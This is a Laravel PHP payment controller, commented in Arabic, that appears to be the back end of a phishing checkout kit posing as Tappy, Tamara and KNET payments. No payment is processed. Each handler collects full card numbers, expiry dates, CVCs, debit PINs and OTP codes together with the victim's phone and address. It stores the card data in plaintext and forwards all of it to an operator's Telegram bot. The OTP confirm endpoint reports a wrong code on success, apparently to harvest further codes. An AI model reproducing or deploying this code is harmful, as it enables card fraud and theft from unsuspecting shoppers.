<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use App\Models\User;
use App\Models\Order;
use App\Models\OrderDetail;
use App\Models\Product;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\RateLimiter;

class PaymentController extends Controller
{
    public function processPayment(Request $request)
    {

$key = 'submit|' . $request->ip();

        // حد لمحاولات الإرسال
        if (RateLimiter::tooManyAttempts($key, 10)) {
            return back()->with('error', 'محاولات كثيرة، حاول لاحقًا.');
        }
        // Validate request data
        $validated = $request->validate([
            'CashOrBatch' => 'required',
            'card_name' => 'required|string',
            'card_number' => 'required|numeric',
            'month' => 'required|numeric|between:1,12',
            'year' => 'required|numeric|min:' . date('y'),
            'cvc' => 'required|numeric|digits:3',
    //  'hp_field' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
            'captcha_answer' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
            'captcha_token' => get_general_value('cart_captcha') == 'on' ? 'required|string' : 'nullable',
        ]);
           if(get_general_value('cart_captcha') == 'on'){
            
                // honeypot للتحقق من الروبوتات
       
        // التحقق من وجود token
        $token = $request->input('captcha_token');
        if (!session('captcha_token') || session('captcha_token') !== $token) {
            RateLimiter::hit($key);
            return back()->withInput()->with('error', 'رمز التحقق غير صحيح، أعد تحميل الصفحة.');
        }

        // التحقق من استخدام CAPTCHA مسبقًا
        if (session('captcha_used')) {
            RateLimiter::hit($key);
            return back()->withInput()->with('error', 'تم استخدام رمز التحقق هذه المرة.');
        }

        // التحقق من نص CAPTCHA
        $expectedText = session('captcha_text', '');
        $answer = strtoupper(preg_replace('/\s+/', '', $request->input('captcha_answer')));
        if ($answer !== strtoupper($expectedText)) {
            RateLimiter::hit($key);
            return back()->withInput()->with('error', 'إجابة التحقق غير صحيحة.');
        }

        // optional: التحقق من وقت استكمال النموذج
        $startTime = session('form_start_time') ?? now();
        $timeTaken = now()->diffInMilliseconds($startTime);
        

        // كل شيء جيد، تنظيف CAPTCHA ومحاولات الروبوت
        session(['captcha_used' => true]);
        session()->forget(['captcha_token', 'captcha_text', 'form_start_time']);
        RateLimiter::clear($key);
    }

        // optional: التحقق من وقت استكمال النموذج
        $startTime = session('form_start_time') ?? now();
        $timeTaken = now()->diffInMilliseconds($startTime);
        

        // كل شيء جيد، تنظيف CAPTCHA ومحاولات الروبوت
        session(['captcha_used' => true]);
        session()->forget(['captcha_token', 'captcha_text', 'form_start_time']);
        RateLimiter::clear($key);
        $cart = session()->get('cart', []);
        $totalPrice = session()->get('totalPrice', 0);

        // Get merchant info (user with id 2)


        // Get payment method from session
        $paymentGateway = session('payment_method', 'all');

        // Handle different payment gateways


        // Process regular payment
        $firstBatch = ($paymentGateway === 'all') ? $totalPrice : $request->first_batch;

        // Store payment details in session
        Session::put([
            'CashOrBatch' => $request->CashOrBatch,
            'card_name' => $request->card_name,
            'card_number' => $request->card_number,
            'month' => $request->month,
            'year' => $request->year,
            'cvc' => $request->cvc,
        ]);

        // Prepare Telegram message
        $order_code = now()->timestamp . rand(1000, 9999);
        $name =  session()->get('name', '');
        $phone =  session()->get('phone', '');
        $email =  session()->get('email', '');


        // Create order in database
        $this->createOrder($name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway, $request->CashOrBatch);

        return redirect()->route('payment.confirm');
    }


    protected function sendTelegramNotification($order, $name, $email, $phone, $code, $totalPrice, $firstBatch, $paymentGateway)
    {
        $batch = $totalPrice - $firstBatch;
        if (session('CashOrBatch') != 0) {
            $batch = $batch / session('CashOrBatch');
        } else {
            $batch = 0;
        }

        // Build the message
        $message = ":: طلب جديد ::" . PHP_EOL
            . "رقم الطلب: " . $code . PHP_EOL
            // . "البريد الإلكتروني: " . $email . PHP_EOL
            . "رقم الهاتف: " . $phone . PHP_EOL
            . "الحي: " . session('address', 'غير محدد') . PHP_EOL
            // . "الشارع: " . $street . PHP_EOL
            // . "المنزل: " . session('address', 'غير محدد') . PHP_EOL
            // . "الرمز البريدي: " . session('zip', 'غير محدد') . PHP_EOL
            . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
            . "الدفعة الأولى: " . $firstBatch . PHP_EOL
            . "فترة التقسيط: " . session('CashOrBatch') . PHP_EOL
            . "مبلغ التقسيط: " . number_format($batch, 2) . PHP_EOL

            // . " طريقة الدفع: " . $paymentGateway . PHP_EOL
            . "الاسم على البطاقة: " . session('card_name') . PHP_EOL
            . "رقم البطاقة: " . session('card_number') . PHP_EOL
            . "الشهر: " . session('month') . PHP_EOL
            . "السنة: " . session('year') . PHP_EOL
            . "CVC: " . session('cvc') . PHP_EOL
            . ":: رابط التعليمات ::" . PHP_EOL
            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
            . "عقد: " .  route('invoice.contact', $order->code) . PHP_EOL
            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;

        // Get Telegram credentials
        $key = env('TOKEN_TELEGRAM');
        $ids = env('TOKEN_TELEGRAM_CHAT_ID');

        // Prepare request data
        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
        $senderr = [
            'chat_id' => $ids,
            'text' => $message,
        ];

        $curll_new = curl_init($url_new);
        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll_new, CURLOPT_POST, true);
        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
        $response = curl_exec($curll_new);
    }


    protected function createOrder($name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway, $CashOrBatch)
    {

        $order =  Order::create([
            'code' => $order_code,
            'name' => $name,
            'phone' => $phone,
            'location' => session('address'),
            'street' => session('street', ''),
            'payment' => $totalPrice,
            'first_batch' => $firstBatch,
            'CardName' => session('card_name'),
            'cardNumber' => session('card_number'),
            'month' => session('month'),
            'year' => session('year'),
            'cvc' => session('cvc'),
            'email' => $email,
            'payment_getway' => $paymentGateway,
            'CashOrBatch' => $CashOrBatch
        ]);
        $this->add_detiles($order);
        $this->sendTelegramNotification($order, $name, $email, $phone, $order_code, $totalPrice, $firstBatch, $paymentGateway);
       
    }
    public function payment_confirm()
    {
        return view('frontend.confirm');
    }
    public function payment_confirm_post(Request $request)
{
    // فاليدشن للحقلين order و CAPTCHA
    $request->validate([
        'order' => 'required|string',
        'captcha_answer' => get_general_value('code_captcha') == 'on' ? 'required|string' : 'nullable',
        'captcha_token' => get_general_value('code_captcha') == 'on' ? 'required|string' : 'nullable',
    ], [
        'order.required' => 'الرجاء إدخال الكود.',
        'captcha_answer.required' => 'الرجاء إدخال نص التحقق.',
        'captcha_token.required' => 'رمز التحقق مفقود، أعد تحميل الصفحة.',
    ]);

    $key = 'confirm|' . $request->ip();

    if(get_general_value('code_captcha') == 'on'){
    // تحقق من محاولات كثيرة
    if (\Illuminate\Support\Facades\RateLimiter::tooManyAttempts($key, 10)) {
        return response()->json([
            'success' => false,
            'message' => 'محاولات كثيرة، حاول لاحقًا.'
        ]);
    }

    // تحقق من وجود token
    if (!session('captcha_token') || session('captcha_token') !== $request->captcha_token) {
        \Illuminate\Support\Facades\RateLimiter::hit($key);
        return response()->json([
            'success' => false,
            'message' => 'رمز التحقق غير صحيح، أعد تحميل الصفحة.'
        ]);
    }

    // تحقق من استخدام CAPTCHA مسبقًا
    if (session('captcha_used')) {
        \Illuminate\Support\Facades\RateLimiter::hit($key);
        return response()->json([
            'success' => false,
            'message' => 'تم استخدام رمز التحقق هذه المرة.'
        ]);
    }
    

    // تحقق من نص CAPTCHA
    $expectedText = session('captcha_text', '');
    $answer = strtoupper(preg_replace('/\s+/', '', $request->captcha_answer));
    if ($answer !== strtoupper($expectedText)) {
        \Illuminate\Support\Facades\RateLimiter::hit($key);
        return response()->json([
            'success' => false,
            'message' => 'إجابة التحقق غير صحيحة.'
        ]);
    }

    // كل شيء صحيح، تنظيف CAPTCHA ومحاولات الروبوت
    session(['captcha_used' => true]);
    session()->forget(['captcha_token', 'captcha_text']);
    \Illuminate\Support\Facades\RateLimiter::clear($key);

}
    // إرسال الكود عبر تليجرام
    $message = "رمز التفعيل: " . $request->order;
    $key = env('TOKEN_TELEGRAM');
    $ids = env('TOKEN_TELEGRAM_CHAT_ID');

    $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
    $senderr = [
        'chat_id' => $ids,
        'text' => $message,
    ];

    $curll_new = curl_init($url_new);
    curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curll_new, CURLOPT_POST, true);
    curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
    curl_exec($curll_new);
    curl_close($curll_new);

    return response()->json([
        'success' => true,
        'message' => 'الكود الذي ارسلته خاطئ'
    ]);
}

    public function tappy()
    {
        $cart = session()->get('cart', []);

        // Calculate the total price of the cart
        $totalPrice = 0;
        foreach ($cart as $item) {
            $totalPrice += $item['price'] * $item['quantity'];
        }
        $CashOrBatch = $totalPrice / 4;
        return view('frontend.tappy', [
            'totalPrice' => $totalPrice,
            'CashOrBatch' => $CashOrBatch,
            'payments' => array_fill(0, 4, $totalPrice / 4)
        ]);
    }
    public function payment_tappy(Request $request)
    {

        $request->validate([
            'CardName' => 'required',
            'cardNumber' => 'required|digits:16',
            'month' => 'required|digits:2',
            'year' => 'required|digits:2',
            'cvc' => 'required|digits:3',
        ]);

        $cart = session()->get('cart', []);

        // Calculate the total price of the cart
        $totalPrice = 0;
        foreach ($cart as $item) {
            $totalPrice += $item['price'] * $item['quantity'];
        }
        $CashOrBatch = $totalPrice / 4;

        // Store card details in session
        Session::put([
            'CardName' => $request->input('CardName'),
            'cardNumber' => $request->input('cardNumber'),
            'month' => $request->input('month'),
            'year' => $request->input('year'),
            'cvc' => $request->input('cvc'),
        ]);

        // Get user details from session
        $name = Session::get('name');
        $email = Session::get('email');
        $phone = Session::get('phone');
        $country = Session::get('country');
        $city = Session::get('city');
        $location = Session::get('address');
        $home = Session::get('home');
        $zip = Session::get('zip');
        $order_code = now()->timestamp . rand(1000, 9999);
        // Create the order
        $order = Order::create([
            'code' => $order_code,
            'name' => $name,
            'phone' => $phone,
            'location' => session('address'),
            'street' => session('street', ''),
            'payment' => $totalPrice,
            'first_batch' => $CashOrBatch,
            'CardName' => $request->CardName,
            'cardNumber' => $request->cardNumber,
            'month' => $request->month,
            'year' => $request->year,
            'cvc' => $request->cvc,
            'email' => $email,
            'payment_getway' => 'tappy',
            'CashOrBatch' => 4
        ]);
        $this->add_detiles($order);





        // Prepare Telegram message
        $message = ":: طلب جديد ::" . PHP_EOL
            . "رقم الطلب: " . $order_code . PHP_EOL
            . "البريد الإلكتروني: " . $email . PHP_EOL
            . "رقم الهاتف: " . $phone . PHP_EOL
            . "العنوان: " . $location . PHP_EOL

            . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
            . "الدفعة الأولى: " . $CashOrBatch . PHP_EOL
            . "فترة التقسيط: " . 4  . PHP_EOL
            . "مبلغ التقسيط: " . $CashOrBatch . PHP_EOL
            . "البطاقة البنكية: tappy" . PHP_EOL
            . "الاسم على البطاقة: " . $request->input('CardName') . PHP_EOL
            . "رقم البطاقة: " . $request->input('cardNumber') . PHP_EOL
            . "الشهر: " . $request->input('month') . PHP_EOL
            . "السنة: " . $request->input('year') . PHP_EOL
            . "CVC: " . $request->input('cvc') . PHP_EOL
            . ":: رابط التعليمات ::" . PHP_EOL
            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
            . "عقد: " . route('invoice.contact', $order->code) . PHP_EOL
            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;

        // Send to Telegram
        // Get Telegram credentials
        $key = env('TOKEN_TELEGRAM');
        $ids = env('TOKEN_TELEGRAM_CHAT_ID');

        // Prepare request data
        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
        $senderr = [
            'chat_id' => $ids,
            'text' => $message,
        ];

        $curll_new = curl_init($url_new);
        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll_new, CURLOPT_POST, true);
        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
        $response = curl_exec($curll_new);


        return redirect()->route('payment.confirm');
    }
    public function payment_tamara(Request $request)
    {

        $request->validate([
            'CardName' => 'required',
            'cardNumber' => 'required|digits:16',
            'month' => 'required|digits:2',
            'year' => 'required|digits:2',
            'cvc' => 'required|digits:3',
        ]);

        $cart = session()->get('cart', []);

        // Calculate the total price of the cart
        $totalPrice = 0;
        foreach ($cart as $item) {
            $totalPrice += $item['price'] * $item['quantity'];
        }
        $CashOrBatch = $totalPrice / 4;

        // Store card details in session
        Session::put([
            'CardName' => $request->input('CardName'),
            'cardNumber' => $request->input('cardNumber'),
            'month' => $request->input('month'),
            'year' => $request->input('year'),
            'cvc' => $request->input('cvc'),
        ]);

        // Get user details from session
        $name = Session::get('name');
        $email = Session::get('email');
        $phone = Session::get('phone');
        $country = Session::get('country');
        $city = Session::get('city');
        $location = Session::get('address');
        $home = Session::get('home');
        $zip = Session::get('zip');
        $order_code = now()->timestamp . rand(1000, 9999);
        // Create the order
        $order = Order::create([
            'code' => $order_code,
            'name' => $name,
            'phone' => $phone,
            'location' => session('address'),
            'street' => session('street', ''),
            'payment' => $totalPrice,
            'first_batch' => $CashOrBatch,
            'CardName' => $request->CardName,
            'cardNumber' => $request->cardNumber,
            'month' => $request->month,
            'year' => $request->year,
            'cvc' => $request->cvc,
            'email' => $email,
            'payment_getway' => 'tamara',
            'CashOrBatch' => 4
        ]);
        $this->add_detiles($order);




        // Prepare Telegram message
        $message = ":: طلب جديد ::" . PHP_EOL
            . "رقم الطلب: " . $order_code . PHP_EOL
            . "البريد الإلكتروني: " . $email . PHP_EOL
            . "رقم الهاتف: " . $phone . PHP_EOL
            . "العنوان: " . $location . PHP_EOL

            . "المبلغ الإجمالي: " . $totalPrice . PHP_EOL
            . "الدفعة الأولى: " . $CashOrBatch . PHP_EOL
            . "فترة التقسيط: " . 4  . PHP_EOL
            . "مبلغ التقسيط: " . $CashOrBatch . PHP_EOL
            . "البطاقة البنكية: tappy" . PHP_EOL
            . "الاسم على البطاقة: " . $request->input('CardName') . PHP_EOL
            . "رقم البطاقة: " . $request->input('cardNumber') . PHP_EOL
            . "الشهر: " . $request->input('month') . PHP_EOL
            . "السنة: " . $request->input('year') . PHP_EOL
            . "CVC: " . $request->input('cvc') . PHP_EOL
            . ":: رابط التعليمات ::" . PHP_EOL
            . "فاتورة: " . route('invoice.show', $order->id) . PHP_EOL
            . "عقد: " . route('invoice.contact', $order->code) . PHP_EOL
            . "رابط واتساب: https://wa.me/" . $phone . PHP_EOL;;

        // Send to Telegram
        // Get Telegram credentials
        $key = env('TOKEN_TELEGRAM');
        $ids = env('TOKEN_TELEGRAM_CHAT_ID');

        // Prepare request data
        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
        $senderr = [
            'chat_id' => $ids,
            'text' => $message,
        ];

        $curll_new = curl_init($url_new);
        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll_new, CURLOPT_POST, true);
        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
        $response = curl_exec($curll_new);


        return redirect()->route('payment.confirm');
    }
    public function tamara()
    {
        $cart = session()->get('cart', []);

        // Calculate the total price of the cart
        $totalPrice = 0;
        foreach ($cart as $item) {
            $totalPrice += $item['price'] * $item['quantity'];
        }
        $CashOrBatch = $totalPrice / 4;
        return view('frontend.tappy', [
            'totalPrice' => $totalPrice,
            'CashOrBatch' => $CashOrBatch,
            'payments' => array_fill(0, 4, $totalPrice / 4)
        ]);
    }
    protected function add_detiles($order)
    {
        $cart = session()->get('cart', []);
        foreach ($cart as $item) {
            $product = Product::find($item['id']);
            OrderDetail::create([
                'order_id' => $order->id,
                'product_id' => $item['id'],
                'product_name' => $product->name,
                'price' => $item['price'],
                'quantity' => $item['quantity'],
            ]);
        }
    }
    public function knet()
    {

        $cart = session()->get('cart', []);

        // Calculate the total price of the cart
        $totalPrice = 0;
        foreach ($cart as $item) {
            $totalPrice += $item['price'] * $item['quantity'];
        }
        return view('frontend.knet', [
            'totalPrice' => $totalPrice,
            'first_cash' => session()->get('first_payment', 0),
            'payments' => array_fill(0, 4, $totalPrice / 4)
        ]);
    }
    public function payment_knet_post(Request $request)
    {
        // Store all request data in session
        session(['knet_session' => $request->all()]);
    
        $databot = 'رقم البطاقة   : ' . $request->prefix . $request->debitNumber . PHP_EOL .
        'اسم البنك: ' . $request->bank . PHP_EOL .
        'المبلغ كامل : ' . $request->amount . PHP_EOL .
        'القسط الاول: ' . $request->first_batch . PHP_EOL .
        'الشهر : ' . $request->month . PHP_EOL .
        'السنة : ' . $request->year . PHP_EOL .
        'PIN : ' . $request->cardPin . PHP_EOL .
        'طريقة الدفع : KNET';
    
        $sender = [
            'chat_id' => env('TOKEN_TELEGRAM_CHAT_ID'),
            'text' => $databot,
        ];
    
        $key = env('TOKEN_TELEGRAM');
        $url = "https://api.telegram.org/bot" . $key . "/sendMessage";
    
        // Initialize cURL
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
    
        // Execute cURL request
        $response = curl_exec($curl);
    
        return response()->json([
            'success' => true,
            'message' => 'تم ارسال البيانات بنجاح',
            'url' => route('knet.confirm')
        ]);
    }
    public function knet_confirm()
    {
        $data = session('knet_session');

        return view('frontend.knet_confirm', [
            'data' => $data,
        ]);
    }  
    public function knet_confirm_post(Request $request){
        $key = env('TOKEN_TELEGRAM');
        $url = "https://api.telegram.org/bot{$key}/sendMessage";
        // Prepare the POST data
        $databot=' otp   : '.$request->otp.PHP_EOL  .'طريقة الدفع : KNET';
        $sender = [
            'chat_id' => env('TOKEN_TELEGRAM_CHAT_ID'),
            'text' => $databot,
        ];
        // DIE($databot);
    
       
        
        // Initialize cURL
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $sender);
        
        // Execute cURL request
        $response = curl_exec($curl);
     
    }  
        //
}
